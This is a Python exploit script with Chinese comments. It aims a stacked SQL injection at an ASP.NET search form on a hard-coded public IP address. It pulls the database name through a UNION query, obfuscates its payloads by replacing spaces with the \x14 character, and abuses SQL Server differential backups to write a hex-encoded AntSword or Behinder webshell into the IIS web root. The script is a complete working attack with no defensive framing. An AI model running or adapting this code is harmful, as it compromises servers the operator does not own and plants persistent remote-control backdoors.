import requests
import time
import binascii
import uuid
import re

target = "http://47.118.64.103/index.aspx"
#target = "http://192.168.242.139/index.aspx"

# 蚁剑或者冰蝎马的路径
local_shell_path = "shell.aspx"
web_root_path = "C:\\inetpub\\wwwroot\\backup_"
web_shell_name = str(uuid.uuid4())[-12:] + ".aspx"
web_backup_name = str(uuid.uuid4())[-12:] + ".txt"
# 通过调用函数get_db_name获取
# db_name = "_backup"

def get_db_name() -> str:
	sql = "1%')union Select 1,2,'3',db_name()--"
	sqls = obfuscate([sql])
	payload = sqls[0]
	burp0_url = target
	burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://47.118.64.103", "Connection": "close", "Referer": "http://47.118.64.103/index.aspx", "Upgrade-Insecure-Requests": "1"}
	burp0_data = {"__VIEWSTATE": "J7I6XiOEvna9208S5svpbdsANo6KURJxT+SVPDKCx9+5PE/OPRtqYpuodBRduJPqCQnKu2fB0ZLuR5bfTK547dUMXaClHDBQ4ndl6FxPkuQ=", "__VIEWSTATEGENERATOR": "90059987", "__EVENTVALIDATION": "5M9W/rdpL0PXYBEGGVDomKjvTVxQhsKNrZ5U16bBJpUAP5NN3ugwcEbzyf+tYyeQEq7GGe35R1YkR8qBMG5PZp5V9KZIgT/k4iukBjDcC/oPUKLI2oecyMG+hZMj6xbp1pMGeSTKCsHmhIL644bRww==", "searchStr": payload, "b1": "Submit"}
	r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
	pattern = "<td><pre>(.*?)</pre></td></tr></table>"
	db_name = re.search(pattern, r.text).group(1)
	print("[*] db_name is :{}".format(db_name))
	return db_name


def load_sqls(local_shell_path:str, web_root_path:str, web_shell_name:str, web_backup_name:str, db_name:str) -> list:
	# 为防止混淆修改了shell内容，读取webshell并转换为hex编码。
	with open(local_shell_path, "rb") as f:
		shell_content = f.read()
		hex_shell_content = "0x" + binascii.hexlify(shell_content).decode("utf-8")
		print(hex_shell_content)

	table_name = "las_" + str(uuid.uuid4())[-12:]
	web_root_path = web_root_path.strip("\\") + "\\"
	web_backup_path = web_root_path + web_backup_name
	web_shell_path = web_root_path + web_shell_name

	# sqls中是备份写马需要执行的命令，是函数的返回值。
	sqls = []
	sqls.append("alter database {} set recovery full".format(db_name))
	sqls.append("create table {}..{}(a image)".format(db_name, table_name))
	sqls.append("backup database {} to disk='{}'".format(db_name, web_backup_path))
	sqls.append("insert into {}..{}(a) values({})".format(db_name, table_name, hex_shell_content))
	# 直接备份
	#sqls.append("backup log {} to disk = '{}' with init".format(db_name, web_shell_path))
	# 差异备份
	sqls.append("backup database {} to disk='{}' with differential, format".format(db_name, web_shell_path))
	sqls.append("drop table {}..{}".format(db_name, table_name))

	return sqls

def obfuscate(sqls:list) -> list:
	n_sqls = []
	for sql in sqls:
		sql = str.replace(sql, "(", "\x14(")
		sql = str.replace(sql, " ", "\x14")
		n_sqls.append(sql)
	return n_sqls

def to_payloads(sqls:list) -> list:
	f = lambda sql: "1');{}--".format(sql)
	return list(map(f, sqls))

def deliver(target:str, payload:str):
	burp0_url = target
	burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://47.118.64.103", "Connection": "close", "Referer": "http://47.118.64.103/index.aspx", "Upgrade-Insecure-Requests": "1"}
	burp0_data = {"__VIEWSTATE": "J7I6XiOEvna9208S5svpbdsANo6KURJxT+SVPDKCx9+5PE/OPRtqYpuodBRduJPqCQnKu2fB0ZLuR5bfTK547dUMXaClHDBQ4ndl6FxPkuQ=", "__VIEWSTATEGENERATOR": "90059987", "__EVENTVALIDATION": "5M9W/rdpL0PXYBEGGVDomKjvTVxQhsKNrZ5U16bBJpUAP5NN3ugwcEbzyf+tYyeQEq7GGe35R1YkR8qBMG5PZp5V9KZIgT/k4iukBjDcC/oPUKLI2oecyMG+hZMj6xbp1pMGeSTKCsHmhIL644bRww==", "searchStr": payload, "b1": "Submit"}
	requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
	print("[+] payload:{}... delivered successfully.".format(payload[:50]))
	time.sleep(2)


if __name__ == "__main__":
	db_name = get_db_name()

	sqls = load_sqls(local_shell_path, web_root_path, web_shell_name, web_backup_name, db_name)
	n_sqls = obfuscate(sqls)
	payloads = to_payloads(n_sqls)	
	for payload in payloads:
		 deliver(target, payload)
	print("The backup filname is:{}\nThe shell name is : {}".format(web_backup_name, web_shell_name))
